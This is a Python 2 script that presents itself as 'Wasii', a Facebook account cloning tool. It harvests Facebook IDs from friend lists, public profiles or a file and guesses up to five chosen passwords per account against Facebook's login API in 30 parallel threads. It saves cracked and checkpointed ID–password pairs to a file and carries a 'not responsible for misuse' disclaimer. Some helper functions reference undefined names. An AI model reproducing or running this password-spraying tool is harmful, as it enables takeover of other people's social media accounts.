# Tool : Wasii ( Facebook cloning tool)
# Author : Waseem Akram ( hackerwasii )
# github : https://github.com/evildevill
# Note : we are not responsible for any misuse
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize, requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 wasi.py')

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exit():
    print '[!] Exit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def wasii(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


banner = '\n\x1b[1;95mTool By Hacker wasii\n We are not responsible for any \nillegal activity\n \n'
back = 0
threads = []
successful = []
checkpoint = []
oks = []
idh = []
id = []

def menu2():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '[!] Token Not Found'
        os.system('rm -rf login.txt')
        os.system('python2 wasi.py')
        time.sleep(1)

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        name = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[!] \x1b[1;91mAccount Is On Checkpoint'
        os.system('rm -rf login.txt')
        os.system('python2 wasi.py')
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '[!]\x1b[1;91m No Connection'
        time.sleep(1)
        exit()

    os.system('clear')
    print banner
    print '|[\xe2\x9c\x93]\x1b[1;93m Name: ' + name
    print '|[\xe2\x9c\x93]\x1b[1;93m ID  : ' + id
    print '-' + 46 * '-'
    print '[1] \x1b[1;93mClone With 5 Choice Passwords.'
    print '[2] \x1b[1;93mClone With 2 Choice Passwords.'
    print '[0] Back To Main Menu.'
    print '                      '
    menu2_menu()


def menu2_menu():
    m2m = raw_input('\nChoose Option >> ')
    if m2m == '':
        print '[!]\x1b[1;91m Filled Incorrectly.'
        time.sleep(1)
        menu2_menu()
    elif m2m == '1':
        choice1()
    elif m2m == '2':
        choice2()
    elif m2m == '0':
        os.system('clear')
        wasii('Please Wait.')
        wasii('While Is Returning To Main Menu.')
        time.sleep(1)
        os.system('python2 .wasii.py')
    else:
        print '[!] \x1b[1;91mWrong Input.'
        menu2_menu()


def choice1():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!]\x1b[1;91m Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 wasi.py')

    os.system('clear')
    print banner
    print '[1] \x1b[1;95mCrack From Friend List.'
    print '[2] \x1b[1;95mCrack From Any Public ID.'
    print '[3] \x1b[1;95mCrack From File.'
    print '[0] Back'
    print '        '
    choice1_menu()


def choice1_menu():
    global oks
    c1m = raw_input('\nChoose Option >> ')
    if c1m == '':
        print '[!] Fill in correctly'
        choice_menu()
    elif c1m == '1':
        os.system('clear')
        print banner
        pass1 = raw_input('[1\x1b[1;95m] Input Password  : ')
        pass2 = raw_input('[2]\x1b[1;95m Input Password  : ')
        pass3 = raw_input('[3\x1b[1;95m] Input Password  : ')
        pass4 = raw_input('[4]\x1b[1;95m Input Password  : ')
        pass5 = raw_input('[5]\x1b[1;95mInput Password  : ')
        print 47 * '-'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif c1m == '2':
        os.system('clear')
        print banner
        idt = raw_input('[\xe2\x9c\x93] Enter ID : ')
        pass1 = raw_input('[1] \x1b[1;95mInput Password  : ')
        pass2 = raw_input('[2] \x1b[1;95mInput Password  : ')
        pass3 = raw_input('[3] \x1b[1;95mInput Password  : ')
        pass4 = raw_input('[4]\x1b[1;95m Input Password  : ')
        pass5 = raw_input('[5]\x1b[1;95m Input Password  : ')
        print 47 * '-'
        print banner
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            wasii('[\xe2\x9c\x93] \x1b[1;93mAccount  Name: ' + op['name'])
            time.sleep(0.5)
        except KeyError:
            print '[!]\x1b[1;91m ID Not Found!'
            raw_input('\nPress Enter To Back ')
            choice1()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif c1m == '3':
        os.system('clear')
        print banner
        try:
            idlist = raw_input('[\xe2\x9c\x93]\x1b[1;95m Enter File Path  : ')
            pass1 = raw_input('[1] \x1b[1;95mInput Password  : ')
            pass2 = raw_input('[2] \x1b[1;95mInput Password  : ')
            pass3 = raw_input('[3]\x1b[1;95m Input Password  : ')
            pass4 = raw_input('[4]\x1b[1;95m Input Password  : ')
            pass5 = raw_input('[5] \x1b[1;95mInput Password  : ')
            print 47 * '-'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] \x1b[1;91mFile Not Found'
            raw_input('\nPress Enter To Back ')
            choice1()

    elif c1m == '0':
        menu2()
    else:
        print '[!] \x1b[1;91mFill in correctly'
        choice1_menu()
    rana = str(len(id))
    wasii('[\xe2\x9c\x93] \x1b[1;91mTotal Friends: ' + rana)
    time.sleep(0.5)
    wasii('[\xe2\x9c\x93]\x1b[1;91m The Process Has Been Started.')
    time.sleep(0.5)
    wasii('[!] \x1b[1;91mPress CTRL Z To Stop Process')
    time.sleep(0.5)
    print 47 * '-'

    def main(arg):
        user = arg
        try:
            os.mkdir('Hacker_wasii')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
                crt = open('Hacker_wasii/checkpoint.txt', 'a')
                crt.write(user + '|' + pass1 + '\n')
                crt.close()
                checkpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
                    crt = open('Hacker_wasii/checkpoint.txt', 'a')
                    crt.write(user + '|' + pass2 + '\n')
                    crt.close()
                    checkpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
                        crt = open('Hacker_wasii/checkpoint.txt', 'a')
                        crt.write(user + '|' + pass3 + '\n')
                        crt.close()
                        checkpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
                            crt = open('Hacker_wasii/checkpoint.txt', 'a')
                            crt.write(user + '|' + pass4 + '\n')
                            crt.close()
                            checkpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
                                crt = open('Hacker_wasii/checkpoint.txt', 'a')
                                crt.write(user + '|' + pass5 + '\n')
                                crt.close()
                                checkpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m----------------------------------------------'
    wasii('[\xe2\x9c\x93] \x1b[1;92mProcess Has Been Completed.')
    wasii('\x1b[1;92m[\xe2\x9c\x93] Checkpoint IDS Has Been Hacker_wasiid.')
    xx = str(len(oks))
    xxx = str(len(checkpoint))
    print '[\xe2\x9c\x93] \x1b[1;95mTotal \x1b[1;32mOK/\x1b[1;97mCP : \x1b[1;32m' + str(len(oks)) + '/\x1b[1;97m' + str(len(checkpoint))
    print 47 * '-'
    raw_input('\nPress Enter To Back ')
    choice1()


def choice2():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 wasi.py')

    os.system('clear')
    print banner
    print '[1]\x1b[1;95m Crack From Friend List.'
    print '[2] \x1b[1;95mCrack From Any Public ID.'
    print '[3] \x1b[1;95mCrack From File.'
    print '[0] Back'
    print '        '
    choice2_menu()


def choice2_menu():
    c2m = raw_input('\nChoose Option >> ')
    if c2m == '':
        print '[!] Fill in correctly'
        choice_menu()
    elif c2m == '1':
        os.system('clear')
        print banner
        pass1 = raw_input('[1]\x1b[1;95m Input Password  : ')
        pass2 = raw_input('[2]\x1b[1;95m Input Password  : ')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif c2m == '2':
        os.system('clear')
        print banner
        idt = raw_input('[\xe2\x9c\x93] \x1b[1;95mEnter ID : ')
        pass1 = raw_input('[1] \x1b[1;95mInput Password  : ')
        pass2 = raw_input('[2] \x1b[1;95mInput Password  : ')
        print 47 * '-'
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            wasii('[\xe2\x9c\x93] \x1b[1;95mAccount  Name: ' + op['name'])
            time.sleep(0.5)
        except KeyError:
            print '[!] ID Not Found!'
            raw_input('\nPress Enter To Back ')
            choice2()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif c2m == '3':
        os.system('clear')
        print banner
        try:
            idlist = raw_input('[\xe2\x9c\x93]\x1b[1;95m Enter File Path : ')
            pass1 = raw_input('[1]\x1b[1;95m Input Password  : ')
            pass2 = raw_input('[2]\x1b[1;95m Input Password  : ')
            print 47 * '-'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\nPress Enter To Back ')
            choice2()

    elif c2m == '0':
        menu2()
    else:
        print '[!] Fill in correctly'
        choice2_menu()
    rana = str(len(id))
    wasii('[\xe2\x9c\x93] \x1b[1;95mTotal Friends: ' + rana)
    time.sleep(0.5)
    wasii('[\xe2\x9c\x93] \x1b[1;95mThe Process Has Been Started.')
    time.sleep(0.5)
    wasii('[!] \x1b[1;95mPress CTRL Z To Stop Process.')
    time.sleep(0.5)
    print 47 * '-'

    def main(arg):
        user = arg
        try:
            os.mkdir('Hacker_wasii')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
                crt = open('Hacker_wasii/checkpoint.txt', 'a')
                crt.write(user + '|' + pass1 + '\n')
                crt.close()
                checkpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
                    crt = open('Hacker_wasii/checkpoint.txt', 'a')
                    crt.write(user + '|' + pass2 + '\n')
                    crt.close()
                    checkpoint.append(user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;93m----------------------------------------------'
    wasii('[\xe2\x9c\x93] \x1b[1;95mProcess Has Been Completed.')
    wasii('\x1b[1;97m[\xe2\x9c\x93] \x1b[1;95mCheckpoint IDS Has Been saved.')
    xx = str(len(oks))
    xxx = str(len(checkpoint))
    print '[\xe2\x9c\x93] Total \x1b[1;32mOK/\x1b[1;97mCP : \x1b[1;32m' + str(len(oks)) + '/\x1b[1;97m' + str(len(checkpoint))
    print 47 * '-'
    raw_input('\nPress Enter To Back ')
    choice2()


if __name__ == '__main__':
    menu2()